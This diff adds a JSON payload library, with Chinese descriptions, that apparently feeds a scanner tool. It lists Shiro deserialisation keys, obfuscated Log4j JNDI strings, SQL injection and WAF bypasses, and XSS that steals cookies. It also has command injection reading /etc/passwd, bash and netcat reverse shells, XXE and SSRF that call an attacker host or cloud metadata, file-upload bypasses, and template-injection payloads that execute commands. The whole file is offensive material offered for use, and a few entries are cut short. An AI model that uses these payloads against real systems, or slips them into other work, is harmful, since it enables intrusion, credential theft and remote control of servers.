@@ -1,0 +1,177 @@
+{
+  "metadata": {
+    "version": "2.2",
+    "last_updated": "2024-11-27",
+    "total_payloads": "500+",
+    "sources": ["PayloadsAllTheThings", "SecLists", "FuzzDB", "实战案例"]
+  },
+  
+  "shiro": {
+    "description": "Shiro反序列化密钥库",
+    "count": 51,
+    "keys": [
+      "kPH+bIxk5D2deZiIxcaaaA==",
+      "4AvVhmFLUs0KTA3Kprsdag==",
+      "Z3VucwAAAAAAAAAAAAAAAA==",
+      "fCq+/xW488hMTCD+cmJ3aQ==",
+      "0AvVhmFLUs0KTA3Kprsdag==",
+      "注: 完整51个密钥已内置于 mega_payload_library.py"
+    ]
+  },
+  
+  "log4j": {
+    "description": "Log4j RCE Payload变种",
+    "count": 35,
+    "categories": {
+      "basic": ["${jndi:ldap://D/a}", "${jndi:rmi://D/a}"],
+      "obfuscated": ["${${::-j}${::-n}${::-d}${::-i}:ldap://D/a}"],
+      "case_bypass": ["${JNDI:LDAP://D/a}", "${jndi:LDAP://D/a}"],
+      "env_bypass": ["${${env:NaN:-j}ndi:ldap://D/a}"]
+    }
+  },
+  
+  "sqli": {
+    "description": "SQL注入完整Payload库",
+    "count": 100,
+    "categories": {
+      "error_based": {
+        "mysql": ["'", "' OR '1'='1", "' AND extractvalue(1,concat(0x7e,version()))--"],
+        "mssql": ["' AND 1=CONVERT(int, (SELECT @@version))--"],
+        "oracle": ["' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--"],
+        "postgresql": ["' AND 1=CAST((SELECT version()) AS int)--"]
+      },
+      "time_based": {
+        "mysql": ["' AND SLEEP(5)--", "' AND BENCHMARK(5000000,MD5('A'))--"],
+        "mssql": ["'; WAITFOR DELAY '0:0:5'--"],
+        "postgresql": ["'; SELECT pg_sleep(5)--"],
+        "oracle": ["' AND DBMS_LOCK.SLEEP(5)--"]
+      },
+      "union_based": [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT 1,2,3,4,5--",
+        "' UNION SELECT user(),database(),version()--"
+      ],
+      "waf_bypass": [
+        "' /*!50000UNION*/ /*!50000SELECT*/--",
+        "' UnIoN SeLeCt--",
+        "' %55nion %53elect--",
+        "' union distinctrow select--"
+      ]
+    }
+  },
+  
+  "xss": {
+    "description": "XSS跨站脚本完整库",
+    "count": 80,
+    "categories": {
+      "basic": [
+        "<script>alert(1)</script>",
+        "<script>alert(document.cookie)</script>"
+      ],
+      "event_handlers": [
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<body onload=alert(1)>",
+        "<input onfocus=alert(1) autofocus>"
+      ],
+      "encoded": [
+        "<script>\\u0061lert(1)</script>",
+        "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "%3Cscript%3Ealert(1)%3C/script%3E"
+      ],
+      "waf_bypass": [
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<svg/onload=alert(1)>",
+        "<svg////onload=alert(1)>"
+      ],
+      "polyglot": [
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e"
+      ]
+    }
+  },
+  
+  "rce": {
+    "description": "命令注入/RCE完整库",
+    "count": 60,
+    "categories": {
+      "basic": ["; whoami", "| whoami", "& whoami", "`whoami`", "$(whoami)"],
+      "space_bypass": ["cat</etc/passwd", "cat$IFS/etc/passwd", "{cat,/etc/passwd}"],
+      "keyword_bypass": ["c''at", "/bin/cat", "cat /e''tc/passwd"],
+      "wildcard": ["cat /etc/pass*", "cat /???/passwd"],
+      "reverse_shell": [
+        "bash -i >& /dev/tcp/A/P 0>&1",
+        "nc -e /bin/sh A P",
+        "python -c 'import socket...'",
+        "php -r '$sock=fsockopen...'"
+      ]
+    }
+  },
+  
+  "file_upload": {
+    "description": "文件上传绕过完整库",
+    "count": 50,
+    "categories": {
+      "php_extensions": [".php", ".php3", ".php4", ".php5", ".phtml", ".pht", ".phps"],
+      "jsp_extensions": [".jsp", ".jspx", ".jsw", ".jsv"],
+      "asp_extensions": [".asp", ".aspx", ".asa", ".cer"],
+      "double_extension": [".php.jpg", ".php;.jpg", ".php%00.jpg", ".php::$DATA"],
+      "case_bypass": [".PhP", ".pHp", ".PHp"],
+      "space_bypass": [".php ", ".php\t"],
+      "dot_bypass": [".php.", ".php.."],
+      "mime_types": ["image/jpeg", "image/png", "application/octet-stream"]
+    }
+  },
+  
+  "xxe": {
+    "description": "XXE外部实体注入",
+    "count": 15,
+    "payloads": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://ATTACKER.com\">]><foo>&xxe;</foo>"
+    ]
+  },
+  
+  "ssrf": {
+    "description": "SSRF服务端请求伪造",
+    "count": 30,
+    "categories": {
+      "localhost": ["http://127.0.0.1", "http://localhost", "http://0.0.0.0"],
+      "cloud_metadata": ["http://169.254.169.254/latest/meta-data/"],
+      "protocols": ["file:///etc/passwd", "dict://127.0.0.1:11211/stats"],
+      "bypass": ["http://127.0.0.1@ATTACKER.com", "http://127.1"]
+    }
+  },
+  
+  "lfi": {
+    "description": "目录遍历/LFI",
+    "count": 25,
+    "categories": {
+      "linux": ["../../../etc/passwd", "../../../../etc/passwd"],
+      "windows": ["..\\..\\..\\windows\\win.ini"],
+      "php_wrapper": ["php://filter/convert.base64-encode/resource=index.php"],
+      "encoded": ["..%2F..%2F..%2Fetc%2Fpasswd"]
+    }
+  },
+  
+  "deserialization": {
+    "description": "反序列化漏洞",
+    "frameworks": {
+      "java": ["ysoserial", "marshalsec"],
+      "python": ["pickle", "__reduce__"],
+      "php": ["unserialize", "phar://"],
+      "dotnet": ["BinaryFormatter", "ObjectStateFormatter"]
+    }
+  },
+  
+  "template_injection": {
+    "description": "模板注入SSTI",
+    "count": 40,
+    "engines": {
+      "jinja2": ["{{7*7}}", "{{config.items()}}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
+      "freemarker": ["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami\")}"],
+      "velocity": ["#set($x=7*7)$x", "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\")"],
+      "thymeleaf": ["${7*7}", "${T(java.lang.Runtime).getRuntime().exec('whoami')}"]
+    }
+  }
+}
